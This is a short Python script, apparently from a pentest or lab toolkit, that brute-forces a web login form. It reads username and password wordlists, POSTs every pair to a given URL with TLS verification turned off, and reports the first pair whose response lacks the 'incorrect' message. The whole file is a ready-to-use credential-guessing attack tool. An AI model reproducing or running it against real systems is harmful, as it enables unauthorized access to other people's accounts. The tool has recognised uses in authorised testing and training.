#!/usr/bin/python3 

from pwn import *
from bs4 import BeautifulSoup
import sys, time, pdb, requests, signal, urllib3

# Disable the alerts for urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 3:
	print("[!] Use: "+ sys.argv[0] + " http://<target-url>/login userlist.txt passwordlist.txt")
	sys.exit(1)

def signal_handler(sig, frame):
	print("\n\n[!] Exiting \n")
	sys.exit(0)

url = sys.argv[1]
argument_1 = sys.argv[2]
argument_2 = sys.argv[3]

p1 = log.progress("Brute Force")
p2 = log.progress("Valid User")
p3 = log.progress("Valid Pass")
p5 = log.progress("Response code")

#Ctrl+C
signal.signal(signal.SIGINT, signal_handler)

def bruteforce():
	userlist = open(argument_1, 'r')
	passlist = open(argument_2, 'r')
	userlines = userlist.readlines()
	passlines = passlist.readlines()


	for user in userlines:
		for passwd in passlines:
			parameter_user = user.strip()
			parameter_pass = passwd.strip()
			p1.status("Testing Username: "+ parameter_user + " - Testing Password: "+ parameter_pass)
			data = {
				'username': parameter_user,
				'password': parameter_pass,
				'form_login': 'Login',
				'lang': 'en_US'
			}

			response = requests.post(url, data=data, verify=False)
			p5.status(response.status_code)

			if "Username or password is incorrect" not in response.text:
				valid_username = parameter_user
				valid_password = parameter_pass
				p2.status(valid_username)
				p3.status(valid_password)
				sys.exit()



if __name__ == '__main__':
	bruteforce()
